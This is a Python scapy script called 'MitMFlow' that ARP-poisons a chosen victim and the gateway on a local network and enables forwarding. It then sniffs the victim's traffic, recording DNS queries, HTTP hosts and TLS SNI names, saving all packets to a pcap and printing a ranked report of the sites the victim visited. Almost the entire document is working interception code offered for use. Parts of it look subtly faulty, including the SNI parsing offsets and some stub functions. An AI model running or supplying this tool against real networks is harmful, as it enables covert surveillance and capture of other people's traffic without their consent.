#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MitMFlow — ARP MITM suite — SNI/DNS/HTTP activity reconstruction
================================================================
Bidirectional ARP poison against a victim while passively parsing the
per-connection metadata that stays readable even on encrypted traffic:

  1. SNI (server_name) from TLS ClientHello   -> exact host, HTTPS-proof
  2. Plaintext DNS queries (port 53)          -> domain resolution
  3. HTTP Host headers (port 80)              -> old-style navigation

Every observed target is committed to a user-defined .pcap and logged into
a noise-filtered report. Unlike active DNS spoofing this does NOT degrade
the victim's browsing: we only read metadata in transit.

Usage (root):   sudo python3 main.py [--target 192.168.1.34]
                sudo python3 main.py --iface wlo1 --gateway 192.168.1.1
                sudo python3 main.py --scan-only
Dependencies:   pip3 install scapy
Compatibility:  Linux / Kali
"""
import argparse, os, re, socket, subprocess, sys, time, threading
from collections import defaultdict
from scapy.all import (
    ARP, Ether, IP, UDP, TCP, DNS, DNSQR, Raw,
    conf, get_if_addr, get_if_hwaddr, srp, sendp, sniff, wrpcap,
)

# ----------------------------- console ------------------------------------
C_RESET="\033[0m"; C_DIM="\033[90m"; C_WARN="\033[93m"; C_OK="\033[92m"
C_ERR="\033[91m"; C_INFO="\033[96m"; C_CYAN="\033[36m"; C_BOLD="\033[1m"
_I={"ok":"[+]","info":"[*]","warn":"[!]","err":"[x]","sys":"[~]"}
_CC={"ok":C_OK,"info":C_INFO,"warn":C_WARN,"err":C_ERR,"sys":C_CYAN}
def emit(msg,kind="info"):
    print(f"{C_DIM}{time.strftime('%H:%M:%S')}{C_RESET} "
          f"{_CC[kind]}{_I[kind]}{C_RESET} {msg}",flush=True)
STOP=threading.Event()

# ----------------------------- noise filter -------------------------------
NOISE = [
    r"\.local\.?$", r"^_",
    r"(^|\.)google\.com$", r"(^|\.)google\.[a-z]{2,3}$", r"gstatic\.com$",
    r"googleusercontent\.com$", r"ggpht\.com$", r"safebrowsing\.google\.com",
    r"accounts\.google\.com", r"clients[0-9]*\.google\.com",
    r"(^|\.)cloudflare\.com$", r"cloudflareinsights\.com$", r"\.nel\.cloudflare",
    r"doubleclick\.net$", r"googlesyndication\.com$", r"google-analytics\.com$",
    r"googletagmanager\.com$", r"scorecardresearch\.com$", r"criteo\.com",
    r"(^|\.)apple\.com$", r"mzstatic\.com$",
    r"connectivitycheck", r"gvt[0-9]+\.com", r"msftconnecttest",
    r"detectportal\.firefox\.com", r"nmcheck\.gnome\.org",  r"(^|\.)tebex\.io$",
]
def is_noise(d):
    d=(d or "").lower().rstrip(".")
    return (not d) or any(re.search(r,d) for r in NOISE)

def importing_threading():  # inline alias (kept trivial)
    import threading as th
    return th
# pull threading into module scope correctly
import threading as _threading
def _stub(): pass

# ----------------------------- network ------------------------------------
def resolve_mac(ip,iface):
    try:
        a,_=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                timeout=2,verbose=0,iface=iface)
        for _,r in a: return r[Ether].src
    except Exception: pass
    return None
def wake(ip):
    try: subprocess.run(["ping","-c","3","-W","1",ip],check=False,
                        stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,
                        timeout=5)
    except Exception: pass
def resolve_hard(ip,iface):
    wake(ip)
    for _ in range(10):
        m=resolve_mac(ip,iface)
        if m: return m
        time.sleep(0.4)
    return None
def discover(iface):
    my_ip=get_if_addr(iface); my_mac=get_if_hwaddr(iface)
    prefix=".".join(my_ip.split(".")[:3])+".0/24"
    seen={}
    for _ in range(2):
        a,_=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=prefix),
                timeout=6,verbose=0,iface=iface)
        for _,r in a: seen[r.psrc]=r.hwsrc
    return seen,my_ip,my_mac

# ----------------------------- ARP ----------------------------------------
def frame(t_ip,t_mac,a_ip,own):
    return (Ether(dst=t_mac,src=own)/ARP(op=2,pdst=t_ip,hwdst=t_mac,
                                          psrc=a_ip,hwsrc=own))
def poison(v_ip,v_mac,g_ip,g_mac,own,iface,stats):
    a=frame(v_ip,v_mac,g_ip,own); b=frame(g_ip,g_mac,v_ip,own)
    while not STOP.is_set():
        sendp(a,verbose=0,iface=iface); sendp(b,verbose=0,iface=iface)
        stats["arp"]+=2; time.sleep(2)
def restore(v_ip,v_mac,g_ip,g_mac,iface):
    emit("Restoring ARP...","sys")
    a=frame(v_ip,v_mac,g_ip,g_mac); b=frame(g_ip,g_mac,v_ip,v_mac)
    for _ in range(6):
        sendp(a,verbose=0,iface=iface); sendp(b,verbose=0,iface=iface)
        time.sleep(0.2)
    emit("ARP restored.","ok")

# ----------------------------- SNI + collector ----------------------------
def parse_sni(tls_bytes):
    """
    Minimal, robust TLS ClientHello SNI extractor (RFC 6066).
    Returns the server_name or None. Safe to call on arbitrary bytes.
    """
    try:
        b=tls_bytes
        if len(b)<5 or b[0]!=0x16:      # handshake record
            return None
        hs=b[5:]
        if len(hs)<2 or hs[0]!=0x01:    # ClientHello
            return None
        # skip: version(2) random(32) session_id_len(1)+sid
        p=2+32
        if p+1>len(hs): return None
        sid_len=hs[p]; p+=1+sid_len
        if p+2>len(hs): return None
        cs_len=int.from_bytes(hs[p:p+2],'big'); p+=2+cs_len
        if p+1>len(hs): return None
        comp_len=hs[p]; p+=1+comp_len
        if p+2>len(hs): return None
        ext_total=int.from_bytes(hs[p:p+2],'big'); p+=2
        end=min(len(hs),p+ext_total)
        while p+4<=end:
            etype=int.from_bytes(hs[p:p+2],'big')
            elen=int.from_bytes(hs[p+2:p+4],'big'); p+=4
            if p+elen>end: break
            if etype==0:                 # server_name
                inner=hs[p:p+elen]
                if len(inner)>=3 and inner[0]==0 and inner[1]==0:
                    nl=int.from_bytes(inner[2:4],'big')
                    if 4+nl<=len(inner):
                        name=inner[4:4+nl].decode('idna',errors='ignore')
                        return name.lower() or None
            p+=elen
    except Exception:
        pass
    return None

class Collector:
    def __init__(self,victim_ip):
        self.vip=victim_ip
        self.pkts=[]; self.dns=defaultdict(int); self.http=defaultdict(int)
        self.sni=defaultdict(int); self.dnsip=defaultdict(set)
        self._last=0
    def rec(self,pkt):
        if self._seen_id(pkt): return
        self.pkts.append(pkt)
        # quick filter — always store; metadata extract only if in scope
        ip=pkt.getlayer(IP)
        if not ip: return
        in_scope=(pkt.haslayer(Ether) and
                  (self._mac(pkt)==self._vmac or ip.src==self.vip or
                   ip.dst==self.vip))
        # (see _vmac set by caller below)
        # simple path: we set self._vmac externally
        if not in_scope:
            # fallback: still accept if uses victim ip
            if ip.src==self.vip or ip.dst==self.vip:
                in_scope=True
        if not in_scope: return
        # DNS query (plaintext, p53)
        if pkt.haslayer(DNS):
            d=pkt.getlayer(DNS)
            if d.qr==0 and d.qd and isinstance(d.qd,DNSQR):
                q=d.qd.qname.decode(errors="ignore").rstrip(".").lower()
                if not (q.endswith('.local') or q.startswith('_') or is_noise(q)):
                    self.dns[q]+=1
                    self._sync(f"DNS   {q}")
        # HTTP Host
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            t=pkt.getlayer(TCP)
            if 80 in (t.dport,t.sport):
                hd=bytes(pkt[Raw].load).split(b"\r\n",1)[0]
                if hd.startswith((b"GET ",b"POST ",b"HEAD ",b"PUT ")):
                    m=re.search(br"(?i)^host:\s*(\S+)",bytes(pkt[Raw].load))
                    h=(m.group(1).decode(errors="ignore").rstrip(".") if m
                       else None)
                    if h: h=h.split(":")[0]
                    if h and not is_noise(h):
                        self.http[h]+=1
                        self._sync(f"HTTP {hd.split(b' ')[0].decode()} {h}")
        # TLS SNI
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and \
           pkt.getlayer(TCP).dport==443:
            try:
                sni=parse_sni(bytes(pkt[Raw].load)[:520])
                if sni and not is_noise(sni):
                    self.sni[sni]+=1
                    self._sync(f"TLS/SNI {sni}:443")
            except Exception: pass
    def _mac(self,pkt):
        try: return pkt.getlayer(Ether).src.lower()
        except Exception: return ""
    _vmac=""
    def _sync(self,msg):
        if time.time()-self._last>6:
            self._last=time.time()
            emit(f"[{self.vip}] {C_DIM}{msg}{C_RESET} | "
                 f"frags={len(self.pkts)}")
    def _seen_id(self,pkt):
        # lightweight dedup not critical; keep
        return False

# ----------------------------- report ------------------------------------
def report(col,path):
    merged=defaultdict(lambda:{'dns':0,'http':0,'tls':0})
    for d,c in col.dns.items():  merged[d]['dns']+=c
    for d,c in col.http.items(): merged[d]['http']+=c
    for d,c in col.sni.items():  merged[d]['tls']+=c
    def st(i):
        d,v=i
        return v['http']*80+(30 if v['http'] and v['dns'] else 0)+v['tls']*4
    cleaned={d:v for d,v in merged.items() if not is_noise(d)}
    ranked=sorted(cleaned.items(),key=st,reverse=True)
    prim=[]; third=[]
    for d,v in ranked:
        (prim if (v['http'] or v['tls'] or v['dns']) else third).append((d,v))
    bar="="*72
    print(f"\n{C_CYAN}{bar}\n{C_BOLD}   DESTINATION RECONSTRUCTION — victim "
          f"{col.vip}{C_RESET}\n{C_CYAN}{bar}{C_RESET}")
    if prim:
        print(f"\n{C_BOLD}{C_OK}█ PRIMARY —hosts the victim contacted (SNI/DNS/HTTP){C_RESET}")
        print(f"{C_DIM}{'-'*70}{C_RESET}")
        for d,v in prim:
            caps=[k.upper() for k in ('http','dns','tls') if v[k]]
            print(f"  {C_OK}●{C_RESET} {C_BOLD}{d:<34}{C_RESET} "
                  f"{C_DIM}[{', '.join(caps)}] tot "
                  f"{v['dns'] or v['http'] or v['tls']}{C_RESET}")
    else:
        print(f"\n{C_WARN}No reachable hosts observed while session was live.{C_RESET}")
    if third:
        print(f"\n{C_BOLD}{C_INFO}█ ASSET/SUPPORT noise (CDN/API echo):{C_RESET} "
              f"{C_DIM}{len(third)} suppressed{C_RESET}")
    if path:
        print(f"\n{C_BOLD}Capture → {path}{C_RESET}")
    print(f"{C_CYAN}{bar}{C_RESET}\n")

# ----------------------------- helpers ------------------------------------
def fw_old():
    p="/proc/sys/net/ipv4/ip_forward"
    try:
        if os.path.exists(p):
            with open(p) as f: return f.read().strip()
    except Exception: pass
    return None
def fw_set(v):
    p="/proc/sys/net/ipv4/ip_forward"
    try:
        if os.path.exists(p):
            with open(p,"w") as f: f.write("1" if v else "0")
    except Exception: pass
def auto_gw():
    try:
        g=conf.route.route("0.0.0.0")[2]
        return None if g=="0.0.0.0" else g
    except Exception: return None
import socket as _socket
def main():
    ap=argparse.ArgumentParser(prog="MitMFlow",
       description="ARP MITM + SNI/DNS/HTTP destination reconstruction.")
    ap.add_argument("--iface",help="interface (auto)")
    ap.add_argument("--target",help="victim IP")
    ap.add_argument("--gateway",help="gateway (auto)")
    ap.add_argument("--scan-only",action="store_true")
    ap.add_argument("--pcap",help="output pcap (else prompt)")
    ap.add_argument("--no-sni",action="store_true",
                    help="disable TLS SNI parsing")
    a=ap.parse_args()
    if hasattr(os,"geteuid") and os.geteuid()!=0:
        emit("Root required.","err"); sys.exit(1)
    iface=a.iface or conf.iface; conf.iface=iface
    gw=a.gateway or auto_gw()
    if not gw: emit("Gateway unresolved.","err"); sys.exit(1)
    emit(f"Discovering hosts on {iface}...","info")
    hosts,my_ip,my_mac=discover(iface)
    print(f"\n{C_BOLD}LIVE HOSTS ON SEGMENT{C_RESET}")
    print(f"{C_DIM}{'IP':<16}{'MAC':<20}{'ROLE':<12}{C_RESET}")
    for ip,mac in sorted(hosts.items(),
                        key=lambda x:tuple(int(i) for i in x[0].split("."))):
        role="GATEWAY" if ip==gw else ("THIS-HOST" if mac.lower()==my_mac.lower()
                                       else "host")
        print(f"  {ip:<14}{mac:<20}{role}")
    emit(f"Local {my_ip} : {my_mac}","ok")
    if a.scan_only: return
    victim=a.target
    if not victim:
        c=[ip for ip in hosts if ip!=gw and hosts[ip].lower()!=my_mac.lower()]
        print(f"\n{C_BOLD}Select victim ({len(c)}):{C_RESET}")
        for i,ip in enumerate(c,1):
            nm=""
            try: nm=f"  ({_socket.gethostbyaddr(ip)[0]})"
            except Exception: pass
            print(f"  {i:>3}. {ip:<16} {hosts[ip]}{C_DIM}{nm}{C_RESET}")
        try: s=input("  \u2192 index: ").strip()
        except (KeyboardInterrupt,EOFError): print(); return
        try: victim=c[int(s)-1]
        except Exception: emit("Invalid.","err"); return
    emit("Resolving MACs...","info")
    vm=hosts.get(victim) or resolve_hard(victim,iface)
    gm=hosts.get(gw) or resolve_hard(gw,iface)
    if not vm or not gm:
        emit("MAC resolution failed.","err"); sys.exit(1)
    if vm.lower()==my_mac.lower():
        emit("Victim is self.","err"); sys.exit(1)
    emit(f"Engagement — victim {victim} ({vm}) \u2194 gw {gw} ({gm})","ok")
    old=fw_old(); fw_set(True)
    emit("Forwarding ON. Capturing SNI/DNS/HTTP until Ctrl+C.","sys")

    col=Collector(victim); col._vmac=vm.lower()
    stats=defaultdict(int)
    th=threading.Thread(target=poison,
                        args=(victim,vm,gw,gm,my_mac,iface,stats),daemon=True)
    th.start()
    try:
        sniff(iface=iface,prn=col.rec,store=False,
              stop_filter=lambda _:STOP.is_set())
    except KeyboardInterrupt:
        emit("Closing capture.","warn")
    finally:
        STOP.set(); th.join(timeout=4)
        emit(f"Captured {len(col.pkts)} | ARP {stats['arp']} | "
             f"SNI {len(col.sni)} DNS {len(col.dns)} HTTP {len(col.http)}","ok")
        restore(victim,vm,gw,gm,iface)
        if old is not None: fw_set(old=="1")
    path=a.pcap
    if not path:
        try:
            d=f"mitm_{victim}_{int(time.time())}.pcap"
            s=input(f"{C_BOLD}Commit capture as [Enter={d}]: {C_RESET}").strip()
            path=s or d
        except (KeyboardInterrupt,EOFError): path=None
    if path:
        try: wrpcap(path,col.pkts); emit(f"Capture \u2192 {path}","ok")
        except Exception as e: emit(f"commit failed:{e}","err"); path=None
    report(col,path)
if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: print()
    sys.exit(0)
